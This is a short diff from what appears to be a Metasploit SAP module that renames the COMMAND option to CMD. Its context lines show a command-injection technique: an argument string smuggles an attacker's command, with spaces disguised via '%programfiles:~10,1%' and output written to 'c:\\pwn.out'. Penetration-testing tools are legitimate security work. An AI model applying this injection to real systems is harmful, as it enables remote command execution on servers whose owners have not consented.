@@ -73,7 +73,7 @@ class Metasploit4 < Msf::Auxiliary
 			if num == 1
 				command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
 				space = "%programfiles:~10,1%"
-				command << datastore['COMMAND'].gsub(" ",space)
+				command << datastore['CMD'].gsub(" ",space)
 			end
 			command = '-ic c:\\\pwn.out' if num == 2
 		end
